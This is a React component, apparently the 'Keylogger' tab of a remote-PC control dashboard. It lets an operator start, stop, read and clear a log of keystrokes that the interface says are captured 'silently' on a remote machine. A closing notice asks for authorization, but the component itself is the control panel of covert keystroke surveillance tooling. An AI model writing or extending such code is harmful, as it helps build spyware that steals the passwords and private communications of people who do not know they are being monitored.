"use client";
import { useState, useEffect } from "react";
import { keyloggerAction, keyloggerStatus } from "@/lib/api";

export default function KeyloggerTab() {
  const [status, setStatus] = useState<"running" | "stopped">("stopped");
  const [logData, setLogData] = useState("");
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState("");

  const fetchStatus = async () => {
    try {
      const data = await keyloggerStatus();
      setStatus(data.status);
      if (data.data) setLogData(data.data);
    } catch {}
  };

  useEffect(() => {
    fetchStatus();
    const iv = setInterval(fetchStatus, 5000);
    return () => clearInterval(iv);
  }, []);

  const action = async (act: string, label: string) => {
    setLoading(true);
    setMsg("");
    try {
      await keyloggerAction(act);
      setMsg(`✅ ${label}`);
      fetchStatus();
    } catch (e: any) {
      setMsg(`❌ ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  const readLog = async () => {
    setLoading(true);
    try {
      const data = await keyloggerAction("read");
      setLogData(data.data || "(no data)");
    } catch (e: any) {
      setMsg(`❌ ${(e as any).message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <div>
        <h2 style={{ fontSize: "1.1rem", fontWeight: 700 }}>⌨️ Keylogger</h2>
        <p style={{ fontSize: "0.8rem", color: "rgba(226,232,240,0.4)", marginTop: 2 }}>
          Silently capture keystrokes on the remote PC
        </p>
      </div>

      {/* Status indicator */}
      <div className="jarvis-card" style={{ padding: 16, display: "flex", alignItems: "center", gap: 16 }}>
        <div style={{
          width: 48, height: 48, borderRadius: "50%",
          background: status === "running" ? "rgba(16,185,129,0.1)" : "rgba(239,68,68,0.1)",
          border: `2px solid ${status === "running" ? "#10b981" : "#ef4444"}`,
          display: "flex", alignItems: "center", justifyContent: "center",
          fontSize: 20, boxShadow: `0 0 15px ${status === "running" ? "rgba(16,185,129,0.3)" : "rgba(239,68,68,0.2)"}`
        }}>
          {status === "running" ? "🟢" : "🔴"}
        </div>
        <div>
          <div style={{ fontWeight: 700, color: status === "running" ? "#10b981" : "#ef4444" }}>
            Keylogger {status === "running" ? "Running" : "Stopped"}
          </div>
          <div style={{ fontSize: "0.75rem", color: "rgba(226,232,240,0.4)" }}>
            {status === "running" ? "Capturing all keystrokes silently" : "Not capturing"}
          </div>
        </div>
      </div>

      {msg && (
        <div style={{
          padding: "10px 14px", borderRadius: 8, fontSize: "0.875rem",
          background: msg.startsWith("✅") ? "rgba(16,185,129,0.1)" : "rgba(239,68,68,0.1)",
          border: `1px solid ${msg.startsWith("✅") ? "rgba(16,185,129,0.3)" : "rgba(239,68,68,0.3)"}`,
          color: msg.startsWith("✅") ? "#10b981" : "#ef4444"
        }}>{msg}</div>
      )}

      {/* Controls */}
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <button className="btn-success" disabled={loading || status === "running"}
          onClick={() => action("start", "Keylogger started")}>
          ▶ Start
        </button>
        <button className="btn-danger" disabled={loading || status === "stopped"}
          onClick={() => action("stop", "Keylogger stopped")}>
          ⬛ Stop
        </button>
        <button className="btn-primary" disabled={loading} onClick={readLog}>
          📋 Read Log
        </button>
        <button className="btn-warning" disabled={loading}
          onClick={() => action("clear", "Log cleared")}>
          🗑 Clear Log
        </button>
        <button className="btn-primary" disabled={loading} onClick={fetchStatus}>
          🔄 Refresh
        </button>
      </div>

      {/* Log display */}
      <div className="jarvis-card" style={{ padding: 0, overflow: "hidden" }}>
        <div style={{
          padding: "10px 16px", borderBottom: "1px solid rgba(0,212,255,0.1)",
          display: "flex", justifyContent: "space-between", alignItems: "center"
        }}>
          <span style={{ fontSize: "0.875rem", fontWeight: 600 }}>📋 Captured Keystrokes</span>
          <span style={{ fontSize: "0.75rem", color: "rgba(226,232,240,0.4)" }}>{logData.length} chars</span>
        </div>
        <div style={{
          background: "#000", padding: 16, fontFamily: "monospace", fontSize: "0.8rem",
          color: "#00d4ff", whiteSpace: "pre-wrap", maxHeight: 400, overflowY: "auto",
          minHeight: 100
        }}>
          {logData || <span style={{ color: "rgba(226,232,240,0.3)" }}>(no keylog data — start keylogger and press "Read Log")</span>}
        </div>
      </div>

      {/* Warning */}
      <div style={{
        background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.2)",
        borderRadius: 8, padding: "10px 14px", fontSize: "0.8rem", color: "#f59e0b"
      }}>
        ⚠️ <strong>Notice:</strong> Use keylogger only on PCs you own or have explicit authorization to monitor.
      </div>
    </div>
  );
}
